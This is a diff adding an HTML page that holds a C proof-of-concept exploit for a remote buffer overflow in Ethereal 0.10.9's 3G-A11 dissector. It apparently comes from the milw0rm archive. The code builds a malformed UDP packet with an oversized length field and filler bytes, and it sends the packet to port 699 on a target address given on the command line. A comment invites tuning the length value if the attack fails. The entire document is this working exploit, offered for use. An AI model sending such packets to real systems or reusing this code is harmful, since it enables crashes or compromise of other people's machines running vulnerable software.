@@ -1,0 +1,47 @@
+<html><head><title>Ethereal <= 0.10.9 "3G-A11" Remote Buffer Overflow Exploit</title></head><pre>                                                                                                                                                                                                                                                               
+/*
+ * 
+ * Ethereal 3G-A11 remote buffer overflow PoC exploit 
+ * --------------------------------------------------
+ * Coded by Leon Juranic &lt;ljuranic@lss.hr&gt; 
+ * LSS Security &lt;http://security.lss.hr/en/&gt;
+ * 
+ */ 
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+
+
+main (int argc, char **argv)
+{
+	int sock;
+	struct sockaddr_in sin;
+	unsigned char buf[1024];
+	char bla[200];
+
+	sock=socket(AF_INET,SOCK_DGRAM,0);
+
+	sin.sin_family=AF_INET;
+	sin.sin_addr.s_addr = inet_addr(argv[1]);
+	sin.sin_port = htons(699);
+
+	buf[0] = 22;
+	memset(buf+1,'A',19);
+	buf[20] = 38;
+	*(unsigned short*)&amp;buf[22] = htons(100); 
+	*(unsigned short*)&amp;buf[28] = 0x0101;
+	buf[30] = 31;
+	buf[31] = 150;   // len for overflow...play with this value if it doesn't work
+
+	memset (bla,'B',200);
+	strncpy (buf+32,bla,180);
+	
+	sendto (sock,buf,200,0,(struct sockaddr*)&amp;sin,sizeof(struct sockaddr));
+}
+
+// milw0rm.com [2005-03-08]</pre></html>
